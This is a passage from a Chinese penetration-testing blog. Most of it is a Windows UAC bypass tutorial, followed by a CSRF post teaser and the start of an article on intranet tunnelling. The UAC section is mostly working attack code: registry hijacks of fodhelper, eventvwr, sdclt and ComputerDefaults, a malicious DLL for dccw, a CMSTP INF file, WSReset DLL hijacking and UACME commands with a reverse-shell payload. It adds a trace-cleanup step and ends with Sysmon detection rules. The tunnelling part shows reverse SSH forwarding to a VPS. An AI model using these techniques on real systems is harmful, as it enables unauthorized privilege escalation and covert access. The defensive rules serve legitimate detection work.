+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">SetRegKey</span><span class="params">(LPCWSTR cmd)</span> </span>&#123;</span><br><span class="line">    HKEY hKey;</span><br><span class="line">    <span class="built_in">RegCreateKeyEx</span>(HKEY_CURRENT_USER,</span><br><span class="line">        <span class="string">L&quot;Software\\Classes\\ms-settings\\shell\\open\\command&quot;</span>,</span><br><span class="line">        <span class="number">0</span>, <span class="literal">NULL</span>, REG_OPTION_NON_VOLATILE, KEY_WRITE, <span class="literal">NULL</span>, &amp;hKey, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">RegSetValueEx</span>(hKey, <span class="literal">NULL</span>, <span class="number">0</span>, REG_SZ, (BYTE*)cmd,</span><br><span class="line">        (<span class="built_in">lstrlen</span>(cmd)<span class="number">+1</span>)*<span class="built_in">sizeof</span>(WCHAR));</span><br><span class="line">    <span class="built_in">RegSetValueEx</span>(hKey, <span class="string">L&quot;DelegateExecute&quot;</span>, <span class="number">0</span>, REG_SZ,</span><br><span class="line">        (BYTE*)<span class="string">L&quot;&quot;</span>, <span class="built_in">sizeof</span>(WCHAR));</span><br><span class="line">    <span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">SetRegKey</span>(<span class="string">L&quot;C:\\Windows\\System32\\cmd.exe&quot;</span>);</span><br><span class="line">    <span class="built_in">ShellExecute</span>(<span class="literal">NULL</span>, <span class="string">L&quot;open&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\Windows\\System32\\fodhelper.exe&quot;</span>,</span><br><span class="line">        <span class="literal">NULL</span>, <span class="literal">NULL</span>, SW_HIDE);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-eventvwr-exe"><a href="#3-2-eventvwr-exe" class="headerlink" title="3.2 eventvwr.exe"></a>3.2 eventvwr.exe</h3><p>事件查看器同样是自动提升程序，启动时查询：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKCU\Software\Classes\mscfile\shell\open\command</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-Item</span> <span class="literal">-Path</span> <span class="string">&quot;HKCU:\Software\Classes\mscfile\shell\open\command&quot;</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;HKCU:\Software\Classes\mscfile\shell\open\command&quot;</span> `</span><br><span class="line">    <span class="literal">-Name</span> <span class="string">&quot;(Default)&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">Start-Process</span> <span class="string">&quot;C:\Windows\System32\eventvwr.exe&quot;</span> <span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意：Windows 10 1607+ 已部分修补此方法，有效性取决于补丁级别。</p>
+</blockquote>
+<h3 id="3-3-sdclt-exe"><a href="#3-3-sdclt-exe" class="headerlink" title="3.3 sdclt.exe"></a>3.3 sdclt.exe</h3><p><code>sdclt.exe</code>（备份和还原中心）利用 control.exe 路径劫持：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-Item</span> <span class="literal">-Path</span> <span class="string">&quot;HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe&quot;</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe&quot;</span> `</span><br><span class="line">    <span class="literal">-Name</span> <span class="string">&quot;(Default)&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;C:\Users\Public\payload.exe&quot;</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">Start-Process</span> <span class="string">&quot;C:\Windows\System32\sdclt.exe&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-4-ComputerDefaults-exe"><a href="#3-4-ComputerDefaults-exe" class="headerlink" title="3.4 ComputerDefaults.exe"></a>3.4 ComputerDefaults.exe</h3><p>与 fodhelper 共用相同注册表路径，使用不同启动程序，在 Win10&#x2F;Win11 上始终可用：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Start-Process</span> <span class="string">&quot;C:\Windows\System32\ComputerDefaults.exe&quot;</span> <span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="四、DLL-劫持绕过-UAC"><a href="#四、DLL-劫持绕过-UAC" class="headerlink" title="四、DLL 劫持绕过 UAC"></a>四、DLL 劫持绕过 UAC</h2><h3 id="4-1-DLL-搜索顺序"><a href="#4-1-DLL-搜索顺序" class="headerlink" title="4.1 DLL 搜索顺序"></a>4.1 DLL 搜索顺序</h3><p>Windows 默认搜索顺序（SafeDllSearchMode 启用）：</p>
+<ol>
+<li>应用程序所在目录</li>
+<li><code>C:\Windows\System32</code></li>
+<li><code>C:\Windows\System</code></li>
+<li><code>C:\Windows</code></li>
+<li>当前工作目录</li>
+<li><code>%PATH%</code> 目录</li>
+</ol>
+<h3 id="4-2-实战：Dccw-dll-劫持"><a href="#4-2-实战：Dccw-dll-劫持" class="headerlink" title="4.2 实战：Dccw.dll 劫持"></a>4.2 实战：Dccw.dll 劫持</h3><p><code>dccw.exe</code>（显示颜色校准）加载 <code>Dccw.dll</code>，将特制 DLL 放在当前目录即可劫持：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// evil_dccw.cpp → 编译为 Dccw.dll</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE h, DWORD reason, LPVOID lp)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (reason == DLL_PROCESS_ATTACH) &#123;</span><br><span class="line">        <span class="built_in">DisableThreadLibraryCalls</span>(h);</span><br><span class="line">        <span class="built_in">ShellExecute</span>(<span class="literal">NULL</span>, <span class="string">L&quot;open&quot;</span>, <span class="string">L&quot;cmd.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, SW_SHOW);</span><br><span class="line">        <span class="built_in">ExitProcess</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Copy-Item</span> .\Dccw.dll C:\Users\Public\</span><br><span class="line"><span class="built_in">cd</span> C:\Users\Public</span><br><span class="line">C:\Windows\System32\dccw.exe</span><br></pre></td></tr></table></figure>
+
+<h2 id="五、CMSTP-WSReset-方法"><a href="#五、CMSTP-WSReset-方法" class="headerlink" title="五、CMSTP &#x2F; WSReset 方法"></a>五、CMSTP &#x2F; WSReset 方法</h2><h3 id="5-1-CMSTP-exe"><a href="#5-1-CMSTP-exe" class="headerlink" title="5.1 CMSTP.exe"></a>5.1 CMSTP.exe</h3><p><code>CMSTP.exe</code>（Connection Manager Profile Installer）可加载 INF 文件执行命令（T1218.003 技术）：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; uac_bypass.inf</span></span><br><span class="line"><span class="section">[version]</span></span><br><span class="line"><span class="attr">Signature</span>=<span class="variable">$chicago</span>$</span><br><span class="line"><span class="attr">AdvancedINF</span>=<span class="number">2.5</span></span><br><span class="line"></span><br><span class="line"><span class="section">[DefaultInstall]</span></span><br><span class="line"><span class="attr">CustomDestination</span>=CustInstDestSectionAllUsers</span><br><span class="line"><span class="attr">RunPreSetupCommands</span>=RunPreSetupCommandsSection</span><br><span class="line"></span><br><span class="line"><span class="section">[RunPreSetupCommandsSection]</span></span><br><span class="line">C:\Windows\System32\cmd.exe</span><br><span class="line"></span><br><span class="line"><span class="section">[CustInstDestSectionAllUsers]</span></span><br><span class="line">49000,<span class="attr">49001</span>=AllUSer_LDIDSection,<span class="number">7</span></span><br><span class="line"></span><br><span class="line"><span class="section">[AllUSer_LDIDSection]</span></span><br><span class="line">&quot;HKLM&quot;,&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE&quot;,&quot;ProfileInstallPath&quot;,&quot;%UnexpectedError%&quot;,&quot;&quot;</span><br><span class="line"></span><br><span class="line"><span class="section">[Strings]</span></span><br><span class="line"><span class="attr">ServiceName</span>=<span class="string">&quot;UACBypass&quot;</span></span><br><span class="line"><span class="attr">ShortSvcName</span>=<span class="string">&quot;UACBypass&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmstp.exe /s C:\Users\Public\uac_bypass.inf</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2-WSReset-exe"><a href="#5-2-WSReset-exe" class="headerlink" title="5.2 WSReset.exe"></a>5.2 WSReset.exe</h3><p><code>WSReset.exe</code> 自动提升，加载 <code>AppxPackaging.dll</code> 等 DLL，利用 DLL 路径劫持：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Copy-Item</span> .\AppxPackaging.dll C:\Users\Public\Downloads\</span><br><span class="line"><span class="variable">$env:Path</span> = <span class="string">&quot;C:\Users\Public\Downloads;&quot;</span> + <span class="variable">$env:Path</span></span><br><span class="line"><span class="built_in">Start-Process</span> C:\Windows\System32\WSReset.exe</span><br></pre></td></tr></table></figure>
+
+<h2 id="六、UACME-工具使用"><a href="#六、UACME-工具使用" class="headerlink" title="六、UACME 工具使用"></a>六、UACME 工具使用</h2><p><a target="_blank" rel="noopener" href="https://github.com/hfiref0x/UACME">UACME</a> 是 hfiref0x 维护的开源工具，收录 60+ 种 UAC 绕过方法：</p>
+<table>
+<thead>
+<tr>
+<th>编号</th>
+<th>方法</th>
+<th>原理</th>
+<th>适用版本</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>23</td>
+<td>fodhelper</td>
+<td>注册表 ms-settings 劫持</td>
+<td>Win10&#x2F;11</td>
+</tr>
+<tr>
+<td>33</td>
+<td>eventvwr</td>
+<td>MSC 注册表劫持</td>
+<td>Win7 - Win10 1607</td>
+</tr>
+<tr>
+<td>39</td>
+<td>ComputerDefaults</td>
+<td>同 fodhelper 路径</td>
+<td>Win10&#x2F;11</td>
+</tr>
+<tr>
+<td>41</td>
+<td>sdclt</td>
+<td>control.exe 路径劫持</td>
+<td>Win10</td>
+</tr>
+<tr>
+<td>44</td>
+<td>WSReset</td>
+<td>Appx DLL 劫持</td>
+<td>Win10</td>
+</tr>
+<tr>
+<td>54</td>
+<td>CMSTP</td>
+<td>INF 命令执行</td>
+<td>Win8 - Win11</td>
+</tr>
+<tr>
+<td>61</td>
+<td>DiskCleanup</td>
+<td>schtasks 劫持</td>
+<td>Win10</td>
+</tr>
+</tbody></table>
+<p>使用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">akagi32.exe          <span class="comment"># 列出所有方法</span></span><br><span class="line">akagi32.exe 23       <span class="comment"># fodhelper 方法</span></span><br><span class="line">akagi64.exe 39       <span class="comment"># ComputerDefaults 方法</span></span><br><span class="line">akagi32.exe 23 <span class="string">&quot;C:\Users\Public\reverse.exe&quot;</span>  <span class="comment"># 自定义 payload</span></span><br></pre></td></tr></table></figure>
+
+<p>核心源码简化（方法23）：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">ucmMethod23</span><span class="params">()</span> &#123;</span><br><span class="line">    CreateKey(HKCU, <span class="string">L&quot;Software\\Classes\\ms-settings\\shell\\open\\command&quot;</span>);</span><br><span class="line">    SetValue(HKCU, commandKey, <span class="string">L&quot;&quot;</span>, payloadPath);</span><br><span class="line">    SetValue(HKCU, commandKey, <span class="string">L&quot;DelegateExecute&quot;</span>, <span class="string">L&quot;&quot;</span>);</span><br><span class="line">    CreateProcess(<span class="string">L&quot;C:\\Windows\\System32\\fodhelper.exe&quot;</span>, ...);</span><br><span class="line">    Sleep(<span class="number">5000</span>);</span><br><span class="line">    DeleteKey(HKCU, <span class="string">L&quot;Software\\Classes\\ms-settings&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="七、UAC-绕过流程图"><a href="#七、UAC-绕过流程图" class="headerlink" title="七、UAC 绕过流程图"></a>七、UAC 绕过流程图</h2><pre class="mermaid">graph TD
+    A[获得 Shell Medium IL] --> B[检查 UAC 级别]
+    B -->|级别4: 已关闭| C[直接提权]
+    B -->|级别1-2: 需绕过| D[枚举自动提升程序]
+    D --> E{选择绕过方法}
+    E -->|注册表劫持| F1[fodhelper 23]
+    E -->|注册表劫持| F2[eventvwr 33]
+    E -->|注册表劫持| F3[ComputerDefaults 39]
+    E -->|路径劫持| F4[sdclt 41]
+    E -->|DLL劫持| F5[WSReset 44]
+    E -->|INF执行| F6[CMSTP 54]
+    F1 & F2 & F3 & F4 & F5 & F6 --> G[执行 Payload]
+    G --> H[获得 High IL Shell]
+    H --> I[清理痕迹: 注册表/文件/日志]</pre>
+
+<h2 id="八、检测与防御"><a href="#八、检测与防御" class="headerlink" title="八、检测与防御"></a>八、检测与防御</h2><h3 id="检测：Sysmon-规则"><a href="#检测：Sysmon-规则" class="headerlink" title="检测：Sysmon 规则"></a>检测：Sysmon 规则</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Sysmon</span> <span class="attr">schemaversion</span>=<span class="string">&quot;4.30&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">EventFiltering</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">RegistryEvent</span> <span class="attr">onmatch</span>=<span class="string">&quot;include&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">TargetObject</span> <span class="attr">condition</span>=<span class="string">&quot;contains&quot;</span>&gt;</span></span><br><span class="line">        \Software\Classes\ms-settings\shell\open\command<span class="tag">&lt;/<span class="name">TargetObject</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">TargetObject</span> <span class="attr">condition</span>=<span class="string">&quot;contains&quot;</span>&gt;</span></span><br><span class="line">        \Software\Classes\mscfile\shell\open\command<span class="tag">&lt;/<span class="name">TargetObject</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">RegistryEvent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ProcessCreate</span> <span class="attr">onmatch</span>=<span class="string">&quot;include&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Image</span> <span class="attr">condition</span>=<span class="string">&quot;end with&quot;</span>&gt;</span>fodhelper.exe<span class="tag">&lt;/<span class="name">Image</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Image</span> <span class="attr">condition</span>=<span class="string">&quot;end with&quot;</span>&gt;</span>ComputerDefaults.exe<span class="tag">&lt;/<span class="name">Image</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ParentImage</span> <span class="attr">condition</span>=<span class="string">&quot;is not&quot;</span>&gt;</span>C:\Windows\explorer.exe<span class="tag">&lt;/<span class="name">ParentImage</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ProcessCreate</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">EventFiltering</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Sysmon</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h3><ol>
+<li><strong>UAC 设为”始终通知”（级别1）</strong>——任何提权都弹窗。</li>
+<li><strong>及时安装安全补丁</strong>——微软每月修补已知绕过路径。</li>
+<li><strong>启用 Windows Defender Credential Guard</strong>。</li>
+<li><strong>通过 GPO&#x2F;AppLocker 限制 HKCU 敏感注册表写入</strong>。</li>
+<li><strong>部署 EDR 并配置 UAC 绕过相关检测规则</strong>。</li>
+</ol>
+<h2 id="九、免责声明"><a href="#九、免责声明" class="headerlink" title="九、免责声明"></a>九、免责声明</h2><blockquote>
+<p><strong>本文内容仅供安全研究与授权的渗透测试使用。</strong> 未经系统所有者明确书面授权，对任何系统实施本文描述的技术均属违法行为。作者不承担因滥用本文信息而导致的任何法律责任。</p>
+<p>合法使用场景：已授权的渗透测试、内部红队演练、安全研究实验室环境、CTF 竞赛。</p>
+<p><strong>请始终遵守相关法律法规及授权范围。</strong></p>
+</blockquote>
+<h2 id="十、总结"><a href="#十、总结" class="headerlink" title="十、总结"></a>十、总结</h2><p>UAC 绕过持续存在的根源：</p>
+<ul>
+<li><strong>自动提升白名单不可移除</strong>：大量系统组件依赖此机制。</li>
+<li><strong>HKCU 注册表可写</strong>：当前用户天生可修改，是注册表劫持温床。</li>
+<li><strong>DLL 搜索顺序攻击面</strong>：非安全目录加载 DLL 的劫持始终可能。</li>
+</ul>
+<p>实战中优先尝试 <strong>fodhelper（方法23）</strong> 和 <strong>ComputerDefaults（方法39）</strong>，在当前主流 Windows 版本中成功率最高。</p>
+<hr>
+<p><strong>参考资源：</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/hfiref0x/UACME">UACME - Defeating Windows User Account Control</a></li>
+<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works">Microsoft Docs - How User Account Control Works</a></li>
+<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1548/002/">MITRE ATT&amp;CK - T1548.002: Bypass User Account Control</a></li>
+<li><a target="_blank" rel="noopener" href="https://lolbas-project.github.io/">LOLBAS Project</a></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/CSRF-principle-exploitation-defense/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/CSRF-principle-exploitation-defense/" class="post-title-link" itemprop="url">CSRF 跨站请求伪造 — 原理、绕过与防御</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-01-10 08:00:00" itemprop="dateCreated datePublished" datetime="2025-01-10T08:00:00+08:00">2025-01-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 08:00:00" itemprop="dateModified" datetime="2026-06-04T08:00:00+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>CSRF 漏洞从原理到实战全记录。涵盖 GET/POST 两种攻击方式、JSON CSRF、Token 绕过技巧（空值/复用/预测/Cookie 灌注）、Referer 校验绕过、SameSite 绕过、CSPT2CSRF 新手法，以及 Burp 生成 PoC 和防御方案。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/CSRF-principle-exploitation-defense/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Intranet-tunnel-proxy/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/Intranet-tunnel-proxy/" class="post-title-link" itemprop="url">内网穿透与隧道技术汇总</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-01-05 08:00:00" itemprop="dateCreated datePublished" datetime="2025-01-05T08:00:00+08:00">2025-01-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在内网渗透中，突破网络隔离、建立持久访问通道是核心挑战。由于防火墙、NAT 与 ACL 限制，直接访问内网通常不可行。隧道与代理技术通过在两端建立加密或伪装通道，将内网流量中继到外网，实现”内网穿透”。本文系统梳理渗透测试中常用的隧道手段，涵盖 SSH 端口转发、Chisel、FRP、Earthworm、ICMP&#x2F;DNS 隧道、iptables 转发及配套代理工具，并提供选型参考与实战示例。</p>
+<hr>
+<h2 id="1-SSH-端口转发"><a href="#1-SSH-端口转发" class="headerlink" title="1. SSH 端口转发"></a>1. SSH 端口转发</h2><p>SSH 是最基础的隧道工具，几乎存在于所有 Linux&#x2F;Unix 系统。</p>
+<h3 id="1-1-本地转发（-L）"><a href="#1-1-本地转发（-L）" class="headerlink" title="1.1 本地转发（-L）"></a>1.1 本地转发（-L）</h3><p>将本地端口流量通过 SSH 转发到目标内网主机。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 本机 8080 → 跳板机 10.0.0.5 → 内网 192.168.1.100:80</span></span><br><span class="line">ssh -L 8080:192.168.1.100:80 root@10.0.0.5</span><br><span class="line"><span class="comment"># 访问 http://127.0.0.1:8080 即访问内网 Web</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-远程转发（-R）"><a href="#1-2-远程转发（-R）" class="headerlink" title="1.2 远程转发（-R）"></a>1.2 远程转发（-R）</h3><p>将跳板机端口流量反向转发至本地内网——突破入站防火墙。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在内网主机执行：VPS 4444 → 内网 192.168.1.50:3389</span></span><br><span class="line">ssh -R 4444:192.168.1.50:3389 root@vps.example.com</span><br><span class="line"><span class="comment"># 在 VPS 上：rdesktop 127.0.0.1:4444</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配合 autossh 保活</span></span><br><span class="line">autossh -M 5555 -NfR 4444:192.168.1.50:3389 root@vps.example.com</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-3-动态转发（-D）"><a href="#1-3-动态转发（-D）" class="headerlink" title="1.3 动态转发（-D）"></a>1.3 动态转发（-D）</h3><p>本地启动 SOCKS5 代理，所有流量经 SSH 隧道动态路由。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 1080 root@10.0.0.5</span><br><span class="line"><span class="comment"># 配合 ProxyChains：proxychains4 nmap -sT -Pn 192.168.1.0/24</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>常用参数：</strong> <code>-N</code>(不执行命令) <code>-f</code>(后台) <code>-T</code>(禁用伪终端) <code>-C</code>(压缩) <code>-g</code>(允许远程连接)</p>
+<hr>
+<h2 id="2-Chisel-—-快速反向隧道"><a href="#2-Chisel-—-快速反向隧道" class="headerlink" title="2. Chisel — 快速反向隧道"></a>2. Chisel — 快速反向隧道</h2><p><a target="_blank" rel="noopener" href="https://github.com/jpillora/chisel">Chisel</a> 是 Go 编写的单二进制隧道工具，跨平台，适合无 SSH 环境的快速穿透。</p>
+<p><strong>反向 SOCKS5：</strong></p>
